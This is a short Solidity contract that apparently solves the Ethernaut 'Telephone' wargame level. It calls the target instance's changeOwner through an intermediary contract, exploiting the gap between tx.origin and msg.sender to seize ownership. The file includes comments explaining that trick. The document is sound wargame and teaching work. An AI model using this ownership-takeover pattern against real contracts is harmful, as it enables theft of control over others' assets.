// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x064E22F1A4De99a76A82F506D22dc9DaD590a83a

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

// deploy contract (using Remix IDE) and call the changeOwner() function

// tx.origin is the one who originates the transaction
// msg.sender is the one calling the method, it can be the same, or, in this case, will be the address of the contract calling it

contract HackTelephone {
    Telephone public telephoneContract =
        Telephone(0x064E22F1A4De99a76A82F506D22dc9DaD590a83a);

    function changeOwner() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
